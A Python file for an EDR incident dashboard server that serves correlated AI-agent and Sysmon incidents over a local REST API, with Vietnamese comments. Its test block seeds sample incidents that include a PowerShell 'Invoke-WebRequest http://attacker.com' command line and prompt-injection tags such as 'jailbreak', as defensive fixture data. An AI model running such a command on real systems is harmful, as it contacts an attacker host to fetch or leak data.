"""
Incident Graph Web Dashboard Server
Serve dashboard.html + REST API /api/incidents.

Chạy cùng EDR: tự khởi động trong graph_builder.py
Mở trình duyệt: http://localhost:8888
"""

import json
import os
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, Any, List

_incident_store: List[Dict] = []
_store_lock = threading.Lock()
MAX_INCIDENTS = 200

# Đường dẫn tới dashboard.html (cùng thư mục với file này)
_HTML_FILE = os.path.join(os.path.dirname(__file__), "dashboard.html")


def push_incident(incident: Dict[str, Any]):
    """Thêm incident mới vào store để Dashboard hiển thị."""
    with _store_lock:
        _incident_store.append({
            "id":           incident.get("incident_id", "?"),
            "type":         incident.get("incident_type", "CORRELATED"),
            "severity":     incident.get("severity", "MEDIUM"),
            "agent":        incident.get("ai_event", {}).get("agent", "Unknown"),
            "action":       incident.get("ai_event", {}).get("action", ""),
            "timestamp":    incident.get("ai_event", {}).get("timestamp", ""),
            "process":      incident.get("sysmon_event", {}).get("Image", ""),
            "cmdline":      incident.get("sysmon_event", {}).get("CommandLine", ""),
            "event_id":     str(incident.get("sysmon_event", {}).get("EventID", "")),
            "prompt_score": incident.get("prompt_analysis", {}).get("injection_score", 0),
            "prompt_risk":  incident.get("prompt_analysis", {}).get("risk_level", ""),
            "tool_risk":    incident.get("tool_analysis", {}).get("risk_level", ""),
            "data_risk":    incident.get("response_analysis", {}).get("risk_level", ""),
        })
        if len(_incident_store) > MAX_INCIDENTS:
            _incident_store.pop(0)


class DashboardHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Tắt access log

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self._serve_html()
        elif self.path == "/api/incidents":
            self._serve_json()
        else:
            self.send_response(404)
            self.end_headers()

    def _serve_html(self):
        try:
            with open(_HTML_FILE, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"dashboard.html not found")

    def _serve_json(self):
        with _store_lock:
            data = json.dumps(_incident_store, ensure_ascii=False).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(data)


class IncidentDashboard:
    def __init__(self, port: int = 8888):
        self.port = port
        self.server = None
        self.thread = None

    def start(self):
        try:
            self.server = HTTPServer(("0.0.0.0", self.port), DashboardHandler)
            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            print(f"[Dashboard] http://localhost:{self.port}")
        except OSError as e:
            print(f"[Dashboard] Không khởi động được (port {self.port} bị chiếm?): {e}")

    def stop(self):
        if self.server:
            self.server.shutdown()


if __name__ == "__main__":
    print("=== Dashboard standalone mode ===")
    print(f"HTML: {_HTML_FILE}")
    d = IncidentDashboard(8888)
    d.start()
    print("Mở http://localhost:8888  |  Ctrl+C để thoát")

    # Thêm vài incident test để xem UI
    import datetime
    for i in range(1, 4):
        push_incident({
            "incident_id": f"INC-{i:04d}",
            "incident_type": ["PROMPT_INJECTION","TOOL_ANOMALY","CORRELATED"][i-1],
            "severity": ["CRITICAL","HIGH","MEDIUM"][i-1],
            "ai_event": {"agent":"Cursor","action":"terminal.execute","timestamp": datetime.datetime.now().isoformat()},
            "sysmon_event": {"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"Invoke-WebRequest http://attacker.com","EventID":1},
            "prompt_analysis": {"injection_score": 85, "risk_level":"CRITICAL","matched_patterns":["system_override","jailbreak"]} if i==1 else {},
        })

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        d.stop()
